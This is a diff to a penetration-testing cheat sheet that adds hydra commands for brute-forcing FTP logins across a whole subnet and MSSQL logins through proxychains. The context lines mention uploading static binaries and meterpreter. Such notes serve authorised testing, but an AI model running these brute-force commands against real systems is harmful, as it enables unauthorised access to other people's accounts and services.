@@ -62,6 +62,8 @@ Only -sT will work - can be a bit slow with an SSH tunnel so setting up a Chisel
 ### Brute Force a Service Through Proxychains    
 
     proxychains hydra 10.10.10.10 ssh -s 22 -L users.txt -P passwords.txt -t 4     
+    proxychains hydra -L usernames -P passwords 10.10.10.0/24 ftp       #brute force a subnet   
+    proxychains hydra -L users –P passwords <IP> mssql   #MSSQL    
 ## Uploading Static Binaries    
 Use static binaries from [here](https://github.com/ernw/static-toolbox) or [here](https://github.com/andrew-d/static-binaries)     
 Upload nmap binary to a Windows target (through meterpreter and scan)      
